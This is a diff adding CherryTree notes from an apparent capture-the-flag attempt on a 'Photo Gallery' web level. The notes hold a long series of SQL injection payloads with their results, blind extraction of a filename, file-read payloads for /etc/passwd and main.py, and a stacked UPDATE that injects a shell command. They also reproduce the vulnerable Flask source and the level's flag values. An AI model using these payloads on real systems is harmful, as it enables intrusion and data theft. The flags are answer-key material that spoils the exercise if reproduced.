@@ -1,0 +1,251 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Photo Gallery" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631549349" ts_lastsave="1631559804">
+    <node name="dirsearcher" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631550568" ts_lastsave="1631552110">
+      <rich_text>- didnt found anything with GET, POST, OPTIONS
+- with wordlist directory-list-2.3-medium.txt</rich_text>
+    </node>
+    <node name="Manual Search" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631550683" ts_lastsave="1631550690">
+      <node name="/" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631550690" ts_lastsave="1631551969">
+        <rich_text scale="h1">GET</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2">Source Code</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h3">HTML:</rich_text>
+        <rich_text>
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Magical Image Gallery&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;h1&gt;Magical Image Gallery&lt;/h1&gt;
+&lt;h2&gt;Kittens&lt;/h2&gt;
+&lt;div&gt;&lt;div&gt;&lt;img src="</rich_text>
+        <rich_text link="webs http://view-source:http://35.190.155.168/25e524a065/fetch?id=1">fetch?id=1</rich_text>
+        <rich_text>" width="266" height="150"&gt;&lt;br&gt;Utterly adorable&lt;/div&gt;&lt;div&gt;&lt;img src="</rich_text>
+        <rich_text link="webs http://view-source:http://35.190.155.168/25e524a065/fetch?id=2">fetch?id=2</rich_text>
+        <rich_text>" width="266" height="150"&gt;&lt;br&gt;Purrfect&lt;/div&gt;&lt;div&gt;&lt;img src="</rich_text>
+        <rich_text link="webs http://view-source:http://35.190.155.168/25e524a065/fetch?id=3">fetch?id=3</rich_text>
+        <rich_text>" width="266" height="150"&gt;&lt;br&gt;Invisible&lt;/div&gt;&lt;i&gt;Space used: 0	total&lt;/i&gt;&lt;/div&gt;
+
+	&lt;/body&gt;
+&lt;/html&gt;
+
+</rich_text>
+        <rich_text scale="h2">Links</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h3">/fetch?id=</rich_text>
+        <rich_text>
+	/fetch?id=1
+	/fetch?id=2
+	/fetch?id=3</rich_text>
+        <node name="/fetch?id=" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631550903" ts_lastsave="1631551869">
+          <rich_text scale="h1">GET</rich_text>
+          <rich_text>
+
+- id=1 and id=2
+   → delivers the image as text/html
+- id=3
+   → delivers 500 answer
+- id=' / id=%27
+   → delivers 500 answer</rich_text>
+        </node>
+        <node name="/fetch" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631551547" ts_lastsave="1631551551">
+          <rich_text scale="h1">GET</rich_text>
+          <rich_text>
+
+- Bad Request</rich_text>
+        </node>
+        <node name="/delete?id=" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631551914" ts_lastsave="1631551926">
+          <rich_text scale="h1">GET</rich_text>
+          <rich_text>
+- id=1
+   → delivers 404 not found</rich_text>
+        </node>
+        <node name="/create" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631551969" ts_lastsave="1631551981">
+          <rich_text scale="h1">OPTIONS</rich_text>
+          <rich_text>
+
+- not found</rich_text>
+        </node>
+      </node>
+    </node>
+    <node name="Exploit Ideas" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631551331" ts_lastsave="1631618507">
+      <rich_text>- trying to brute force different ids up to 1337
+- trying sql injection on fetch?id=§§
+   → 1 #
+      ⇒ returns first image
+   → 3 #
+      ⇒ still 500
+   → 1337 UNION select version() #
+      ⇒ 500 error
+   → 1337 or 1=1 #
+      ⇒ returns first image
+      ⇒ vulnerable to sql injection
+   → 1337 or 1=1 LIMIT 0, 1 #
+      ⇒ retrives first image
+   → 1337 or 1=1 LIMIT 1, 1 #
+      ⇒ retrieves second image
+   → 1337 or 1=1 LIMIT 2, 1 #
+      ⇒ 500 status error
+   → 1337 or 1=1 LIMIT 3, 1 #
+      ⇒ 404 not found
+   → 1337 or 1=1 LIMIT 0, 3 #
+      ⇒ first image
+   → 1337 or 1=1 ORDER BY id DESC LIMIT 0, 1 #
+      ⇒ 500
+   → 1337 or 1=1 ORDER BY ID DESC LIMIT 0, 1 #
+      ⇒ 500
+   → 1337; select version(); #
+      ⇒ 404 not found
+   → 1337 UNION NULL #
+      ⇒ 500
+   → 1337 UNION NULL, NULL #
+   → 1337 UNION ‘test’
+      ⇒ 500
+   → 1 ORDER BY 2#
+      ⇒ 500
+   → 1 ORDER BY 1#
+      ⇒ first image
+      ⇒ select statement only uses one column
+   → 1337 UNION select 'test' #
+      ⇒ returns 500
+      ⇒ maybe a filter thats check for file type
+      ⇒ maybe tries to load file from path
+         • 1337 UNION select ‘/etc/passwd’ #
+   → using blind injection and sqlmap to find the following schema
+Database: level5
+Table: albums
+[2 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| id     | int(11) |
+| title  | text    |
++--------+---------+
+
+Database: level5
+Table: photos
+[4 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| filename | text    |
+| id       | int(11) |
+| parent   | int(11) |
+| title    | text    |
++----------+---------+
+   → got the hint that the app runs on uwsgi-nginx-flask-docker
+      ⇒ could have figured out on my own by thinking how an image woulde be stored inisde of a database (not as file but path)
+      ⇒ looked at the filestructure
+         • static
+         • main.py
+         • uwsgi.ini
+         • pictures are probably stored in static
+         • app queries for filename then tries to load file from system
+         • tried payload 1337 UNION select '/../main.py'
+            ◇ received content of main.py file
+   → try to bruteforce filename of photo with id = 3 with
+      ⇒ by finding filename length with 3 and CHAR_LENGTH(filename) = §§
+         • if 404 wrong length
+         • if 500 right length
+      ⇒ by finding the letters for each position by 1 and SUBSTRING((SELECT filename of photos where id = 3), §i§, 1) = ‘§j§’ # i index of filename, j letter that is tried
+         • if 404 wrong letter
+         • if 200 found letter
+      ⇒ found filename: 1860798937324d373792ac19d37a6236c9a28f9078955420d1f9b549addf6ce5
+         • might be hex part of flag
+         • it is
+   → trying to inject update statement to change filename to exploit the mechanism for checking file size
+      ⇒ payload "1; UPDATE photos SET filename = 'temp || ls -la' WHERE id = 3; COMMIT;"
+         • worked
+      ⇒ trying to spawn reverse shell
+         • payload </rich_text>
+    </node>
+    <node name="main.py" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631559804" ts_lastsave="1631559876">
+      <rich_text>from flask import Flask, abort, redirect, request, Response
+import base64, json, MySQLdb, os, re, subprocess
+
+app = Flask(__name__)
+
+home = '''
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Magical Image Gallery&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;h1&gt;Magical Image Gallery&lt;/h1&gt;
+$ALBUMS$
+	&lt;/body&gt;
+&lt;/html&gt;
+'''
+
+viewAlbum = '''
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;$TITLE$ -- Magical Image Gallery&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;h1&gt;$TITLE$&lt;/h1&gt;
+$GALLERY$
+	&lt;/body&gt;
+&lt;/html&gt;
+'''
+
+def getDb():
+	return MySQLdb.connect(host="localhost", user="root", password="", db="level5")
+
+def sanitize(data):
+	return data.replace('&amp;', '&amp;amp;').replace('&lt;', '&amp;lt;').replace('&gt;', '&amp;gt;').replace('"', '&amp;quot;')
+
+@app.route('/')
+def index():
+	cur = getDb().cursor()
+	cur.execute('SELECT id, title FROM albums')
+	albums = list(cur.fetchall())
+	
+	rep = ''
+	for id, title in albums:
+		rep += '&lt;h2&gt;%s&lt;/h2&gt;\n' % sanitize(title)
+		rep += '&lt;div&gt;'
+		cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
+		fns = []
+		for pid, ptitle, pfn in cur.fetchall():
+			rep += '&lt;div&gt;&lt;img src="fetch?id=%i" width="266" height="150"&gt;&lt;br&gt;%s&lt;/div&gt;' % (pid, sanitize(ptitle))
+			fns.append(pfn)
+		rep += '&lt;i&gt;Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '&lt;/i&gt;'
+		rep += '&lt;/div&gt;\n'
+
+	return home.replace('$ALBUMS$', rep)
+
+@app.route('/fetch')
+def fetch():
+	cur = getDb().cursor()
+	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
+		abort(404)
+
+	# It's dangerous to go alone, take this:
+	# ^FLAG^39e66e1decfac4403d28af1aed736d42243b6f0984dd2045219fc47b8d79db17$FLAG$
+
+	return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
+
+if __name__ == "__main__":
+	app.run(host='0.0.0.0', port=80)
+</rich_text>
+    </node>
+    <node name="Flags" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631616370" ts_lastsave="1631616403">
+      <rich_text>- found in main.py
+- filename of photo with id 3 is hex part of flag</rich_text>
+    </node>
+  </node>
+</cherrytree>
